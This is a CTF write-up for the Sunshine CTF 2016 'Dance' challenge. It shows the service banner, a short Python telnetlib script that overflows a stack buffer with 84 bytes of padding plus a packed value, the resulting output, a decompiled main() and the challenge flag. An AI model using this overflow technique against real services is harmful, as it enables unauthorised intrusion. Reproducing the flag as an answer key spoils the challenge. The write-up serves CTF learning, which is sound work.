---
title:   "Write-up - Sunshine CTF 2016 - Dance"
date:    2016-03-14 00:00:00
tags:    [Write-up, Sunshine CTF 2016]
summary: "Write-up about Sunshine CTF 2016 - Dance"
---

In this challenge, we have a binary file and we need to connect to an IP using Netcat; `nc 4.31.182.242 9001`. We have then the following message:

```
welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
give us ur sick dance moves like so:
whip,naenae,whip,whip,naenae<ENTER>

whip,naenae,whip,naenae,whip
do the whip!
   (;P)
 8=/||\_
_/¯    ¯\_
do the naenae
(\)
  \(:O)
   /||\_
_/¯    ¯\_
do the whip!
   (;P)
 8=/||\_
_/¯    ¯\_
do the naenae
(\)
  \(:O)
   /||\_
_/¯    ¯\_
do the whip!
   (;P)
 8=/||\_
_/¯    ¯\_

cool dance! come again!
```

After performing a quick program analysis, we can see that we can perform a [buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow). We will use the following Python code to solve this challenge:

```
import telnetlib
import struct

x = lambda a: struct.pack('I', a)
host = "4.31.182.242"
port = "9001"

c = telnetlib.Telnet(host, port)
print c.read_until("<ENTER>")
c.write('A'*84)
c.write(x(0x12adaac9))
print c.read_all()
```

We will have then the following message which is the `main()` function of the binary file we have decompiled.

```
''' OUTPUT:
welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
give us ur sick dance moves like so:
whip,naenae,whip,whip,naenae<ENTER>
girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
cool dance! come again!
'''

''' BONUS:
int main() {
    memset(input, 0x0, 0x50);
    printf("welcome to the pro club.");
    fgets(input, 0x59, stdin);
    while (strlen(input) > 0x0) {
        if (sign_extend_32(*(int8_t *)input) == 0x77) {
            input = input + 0x5;
            do_whip();
        }
        else {
            if (sign_extend_32(*(int8_t *)input) == 0x6e) {
                input = input + 0x7;
                do_naenae();
            }
            else {
                input = input + 0x1;
            }
        }
    }
    if (0x12adaac9 == 0x12adaac9) {
        if (0x0 != 0x0) {
            printf("FLAG FLAG FLAG\n");
        }
    }
    else {
        printf("those dance moves are some dark artsz kid\n");
    }
    printf("\ncool dance! come again!\n");
    return 0x0;
}
'''
```

The flag to solve this challenge is `sun{d4nc3_0n_th3_s7ack}`.
